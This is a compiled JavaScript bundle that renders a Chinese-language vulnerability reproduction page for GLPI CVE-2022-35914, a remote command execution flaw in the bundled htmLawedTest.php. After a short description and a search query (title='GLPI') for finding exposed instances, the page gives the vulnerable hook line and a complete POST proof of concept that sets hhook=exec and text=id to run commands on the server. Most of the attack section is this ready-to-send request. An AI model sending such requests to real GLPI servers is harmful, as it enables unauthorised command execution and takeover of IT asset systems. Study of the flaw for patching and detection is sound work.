(window.webpackJsonp=window.webpackJsonp||[]).push([[47],{2197:function(t,s,a){t.exports=a.p+"assets/img/1664764583921-930e166a-74b4-48a3-af34-9bcb1e20fa0f.04f64ef8.png"},2198:function(t,s,a){t.exports=a.p+"assets/img/1664889433165-f745a7dc-7774-4ff0-abe6-c96d4f2f796c.9dd723ae.png"},2199:function(t,s,a){t.exports=a.p+"assets/img/1664893382208-bf44fba7-3b95-4197-a2bb-d139ec21f1d9.2b93edf2.png"},2200:function(t,s,a){t.exports=a.p+"assets/img/1664946511507-81cddbd6-de1a-4df9-b7cb-da460b4c1516.c336a32f.png"},2201:function(t,s,a){t.exports=a.p+"assets/img/1664946759678-b3032a67-4717-44f7-a00d-101e690f8b53.a154265c.png"},2202:function(t,s,a){t.exports=a.p+"assets/img/1664764633952-b6bb3e54-7b6a-49c2-94b6-39fd5cb0d032.7d329e5e.png"},2203:function(t,s,a){t.exports=a.p+"assets/img/1664764647931-b53cbf79-aa45-48d4-9581-f88a58ff1b61.c63dedd3.png"},2204:function(t,s,a){t.exports=a.p+"assets/img/1664764696143-4f92e328-735b-4587-987d-1552817796f1.ec263820.png"},3369:function(t,s,a){"use strict";a.r(s);var e=a(63),r=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"glpi-htmlawedtest-php-远程命令执行漏洞-cve-2022-35914"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#glpi-htmlawedtest-php-远程命令执行漏洞-cve-2022-35914"}},[t._v("#")]),t._v(" GLPI htmLawedTest.php 远程命令执行漏洞 CVE-2022-35914")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("GLPI是个人开发者的一款开源IT和资产管理软件。该软件提供功能全面的IT资源管理接口，你可以用它来建立数据库全面管理IT的电脑，显示器，服务器，打印机，网络设备，电话，甚至硒鼓和墨盒等。GLPI 10.0.2及之前版本存在安全漏洞，该漏洞源于htmlawed 模块中 允许 PHP 代码注入")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("GLPI")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('title="GLPI"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("登录页面")]),t._v(" "),s("p",[s("img",{attrs:{src:a(2197),alt:"img"}})]),t._v(" "),s("p",[t._v("出现问题的文件为 "),s("strong",[t._v("htmLawedTest.php，")]),t._v(" 来源于第三方库 PHP Labware")]),t._v(" "),s("p",[s("img",{attrs:{src:a(2198),alt:"img"}})]),t._v(" "),s("div",{staticClass:"language-sql line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-sql"}},[s("code",[t._v("https:"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//www.bioinformatics.org/phplabware/internal_utilities/htmLawed/")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[t._v("在 htmLawedTest.php 中接收参数并传入方法 htmLawed 中")]),t._v(" "),s("p",[s("img",{attrs:{src:a(2199),alt:"img"}})]),t._v(" "),s("p",[t._v("跟进文件 htmLawed.php 中")]),t._v(" "),s("p",[s("img",{attrs:{src:a(2200),alt:"img"}})]),t._v(" "),s("div",{staticClass:"language-sql line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-sql"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$C"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'hook'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("{$t "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" $C"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'hook'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$t"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" $C"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" $S"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("}\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[t._v("这里可以看到参数均为用户可控参数，当控制参数 hhook 为 exec 和 text 为执行的命令时就导致了命令执行漏洞")]),t._v(" "),s("p",[s("img",{attrs:{src:a(2201),alt:"img"}})]),t._v(" "),s("p",[t._v("验证POC")]),t._v(" "),s("div",{staticClass:"language-sql line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-sql"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("vendor"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("htmlawed"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("htmlawed"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("htmLawedTest"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:a(2202),alt:"img"}})]),t._v(" "),s("p",[s("img",{attrs:{src:a(2203),alt:"img"}})]),t._v(" "),s("p",[t._v("访问页面获取到 sid 与 token 后再发送请求包")]),t._v(" "),s("div",{staticClass:"language-sql line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-sql"}},[s("code",[t._v("POST "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("vendor"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("htmlawed"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("htmlawed"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("htmLawedTest"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php HTTP"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost: \nAccept: "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nAccept"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding: gzip"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" deflate\nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length: "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("88")]),t._v("\nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("Type")]),t._v(": application"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("x"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("www"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("form"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("urlencoded\n\ntoken"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("a79cf121bde57fe0e3cc0f247f77961a"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("text")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("id"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("hhook"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("exec")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("sid"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("h1c0vk004dvulal5nj8i6en44e\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br")])]),s("p",[s("img",{attrs:{src:a(2204),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);